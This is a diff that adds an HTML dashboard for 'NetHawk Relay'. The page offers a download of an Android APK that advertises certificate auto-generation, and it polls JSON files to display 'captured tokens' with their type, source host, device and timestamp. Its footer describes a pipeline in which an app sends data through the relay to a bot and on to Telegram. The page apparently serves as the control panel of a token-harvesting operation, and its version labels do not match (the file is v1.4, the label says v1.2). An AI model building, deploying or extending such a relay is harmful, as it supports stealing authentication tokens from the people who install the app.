@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NetHawk Relay</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { background:#000; color:#fff; font-family:'Courier New', monospace;
+         min-height:100vh; display:flex; flex-direction:column; align-items:center;
+         padding:32px 16px; }
+  .frame { width:100%; max-width:640px; border:1px solid #222; padding:28px 20px; }
+  h1 { font-size:20px; letter-spacing:4px; text-align:center; font-weight:normal; }
+  .sub { color:#888; text-align:center; font-size:11px; margin-top:6px; letter-spacing:2px; }
+  .rule { border-top:1px solid #222; margin:22px 0; }
+  .banner { border:1px dashed #444; padding:12px; font-size:12px; color:#bbb;
+            text-align:center; line-height:1.8; margin-bottom:22px; }
+  a.dl { display:block; text-align:center; border:2px solid #fff; color:#fff;
+         text-decoration:none; padding:18px; font-size:16px; letter-spacing:1px;
+         transition:all .2s; }
+  a.dl:hover { background:#fff; color:#000; }
+  .size { display:block; font-size:11px; color:#888; margin-top:8px; }
+  h2 { font-size:13px; letter-spacing:2px; color:#fff; margin-bottom:10px; font-weight:normal; }
+  .kv { font-size:12px; color:#bbb; line-height:2; word-break:break-all; }
+  .kv b { color:#fff; }
+  .dot { display:inline-block; width:8px; height:8px; border-radius:50%;
+         background:#0f0; margin-left:6px; animation:blink 1.4s infinite; }
+  @keyframes blink { 50% { opacity:.25; } }
+  .tokens { font-size:11px; color:#777; line-height:1.9; word-break:break-all; }
+  .tok { border-top:1px dotted #333; padding:6px 0; }
+  .foot { margin-top:26px; text-align:center; font-size:10px; color:#555;
+          letter-spacing:2px; line-height:2; }
+</style>
+</head>
+<body>
+<div class="frame">
+  <h1>🦅 NETHAWK RELAY</h1>
+  <div class="sub">SERVER GATEWAY · API ONLY</div>
+
+  <div class="rule"></div>
+
+  <div class="banner">
+    ⚠️ دي <b>بوابة السيرفر</b> — مش واجهة التطبيق!<br>
+    التطبيق بيتثبّت من ملف الـ APK اللي تحت (مش من اللينك ده كواجهة)
+  </div>
+
+  <a class="dl" href="NetHawk-1.4.apk">⬇ DOWNLOAD NetHawk v1.2 — CERT AUTO-GENERATE + RETRY — SAVE ALWAYS WORKS
+    <span class="size">2.9 MB · Android 7.0+ · NEW APP — install fresh</span>
+  </a>
+
+  <div class="rule"></div>
+
+  <h2><span class="dot"></span>SERVER STATUS</h2>
+  <div class="kv" id="status">loading...</div>
+
+  <div class="rule"></div>
+
+  <h2>CAPTURED TOKENS</h2>
+  <div class="kv" id="tcount">loading...</div>
+  <div class="tokens" id="tlist"></div>
+
+  <div class="foot">
+    NETHAWK RELAY · DATA PLANE: GITHUB CONTENTS API<br>
+    APP → RELAY → BOT → TELEGRAM
+  </div>
+</div>
+
+<script>
+  const TS = () => Date.now();
+  async function grab(p) {
+    const r = await fetch(p + "?t=" + TS(), {cache:"no-store"});
+    if (!r.ok) throw 0;
+    return r.json();
+  }
+  function esc(s){ const d=document.createElement("div"); d.textContent=s; return d.innerHTML; }
+  function fmt(ts){ try { return new Date(ts).toLocaleString("ar-EG"); } catch(e){ return ""; } }
+  function mask(t){ if(!t) return ""; return t.length>26 ? t.slice(0,14)+"••••••"+t.slice(-8) : t; }
+
+  async function load() {
+    try {
+      const s = await grab("data/status.json");
+      const d = (s.d && s.d.length) ? s.d[s.d.length-1] : null;
+      document.getElementById("status").innerHTML = d
+        ? "LAST: <b>" + esc(d.last||"") + "</b><br>FROM: " + esc(d.from||"")
+          + " · " + esc(d.device||"") + "<br>TIME: " + fmt(d.ts)
+        : "empty (waiting for app)";
+    } catch(e) { document.getElementById("status").textContent = "unreachable"; }
+
+    try {
+      const t = await grab("data/tokens.json");
+      const arr = t.d || [];
+      document.getElementById("tcount").innerHTML =
+        "COUNT: <b>" + arr.length + "</b>";
+      document.getElementById("tlist").innerHTML = arr.slice(-5).reverse().map(e =>
+        '<div class="tok">[' + esc(e.type||"?") + '] ' + esc(mask(e.token||""))
+        + '<br><span style="color:#555">' + esc(e.host||"") + " · " + fmt(e.ts) + '</span></div>'
+      ).join("");
+    } catch(e) {
+      document.getElementById("tcount").textContent = "empty (no tokens yet)";
+      document.getElementById("tlist").innerHTML = "";
+    }
+  }
+  load();
+  setInterval(load, 20000);
+</script>
+</body>
+</html>
